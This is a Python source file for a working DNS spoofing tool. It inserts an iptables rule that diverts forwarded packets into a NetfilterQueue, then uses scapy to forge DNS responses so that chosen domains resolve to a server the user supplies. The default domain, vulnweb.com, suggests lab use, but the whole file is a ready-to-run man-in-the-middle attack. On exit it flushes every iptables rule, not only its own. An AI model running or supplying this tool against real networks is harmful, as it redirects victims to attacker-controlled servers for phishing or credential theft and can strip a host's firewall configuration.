#!/usr/bin/env python3
import sys, os, subprocess, argparse
try:
    import scapy.all as scapy
    from netfilterqueue import NetfilterQueue
except ImportError as e:
    print("\n[-] Dependency Error: Virtual Environment missing or incomplete.")
    print(f"    Specific missing module: {e}")
    print("\n[*] Please follow these steps to fix the environment:")
    print("\n    1. Create the virtual environment in the parent directory:")
    print("       python3 -m venv ../venv")
    print("\n    2. Activate it and install the required tools:")
    print("       source ../venv/bin/activate")
    print("       pip install scapy NetfilterQueue")
    print("\n    3. Run the script using the specific venv python path:")
    print("       sudo ../venv/bin/python3 dns_spoof.py\n")
    
    sys.exit()


def root_check():
    if os.geteuid() != 0:
        sys.exit("[!] This script must run as root")
    else:
        print("[*] Welcome to the DNS Spoofer.")


def iptable_insert():
    try:
        '''
        subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        or
        '''
        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        
        print("[*] Iptables intercepting rule inserted")
    except Exception as e:
        print(f"[!] Error inserting iptables rule: {e}")

def iptable_flush():
    try:
        subprocess.run(['iptables', '--flush'], check=True)
        print("[*] Iptables rules flushed")
    except Exception as e:
        print(f"[!] Error flushing iptables: {e}")


def parse_args():
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument('-s', '--server', required=True, help="Server's IP address to redirect to")
    parser.add_argument('-d', '--domain', required=True, default="vulnweb.com", help="Domains to spoof, separated by comma (ex. bing.com,google.com)")
    return parser.parse_args()


def process_packet(packet, redirect_ip, target_list):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            if any(domain in qname.decode() for domain in target_list):
                print(f"[+] Spoofing DNS response for: {qname.decode()}")

                # Forge the DNS response
                answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip) # destination is the server to redirect to
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Remove checksums so Scapy recalculates them
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))

    except Exception as e:
        print(f"[!] Error processing packet: {e}")

    packet.accept()


if __name__ == "__main__":
    root_check()
    args = parse_args()
    destination_server = args.server
    target_domain = args.domain.split(',')

    iptable_insert()

    # create the object, bind to the iptables command and run
    queue = NetfilterQueue()

    try:
        #Awesome lambda function to pass three arguments to Netfilterqueue
        queue.bind(1337, lambda packet: process_packet(packet, destination_server, target_domain))
        try:
            print("[*] Starting packet interception. Press Ctrl+C to stop.")
            queue.run()
        except KeyboardInterrupt:
            print("\n[!] User Interruption detected. Exiting gracefully.")
        except Exception as e:
            print(f"[!] An error has occurred running NSQUEU: {e}")
    except Exception as e:
        print(f"[!] An error has occurred binding NSQUEU: {e}")
    finally:
        iptable_flush()
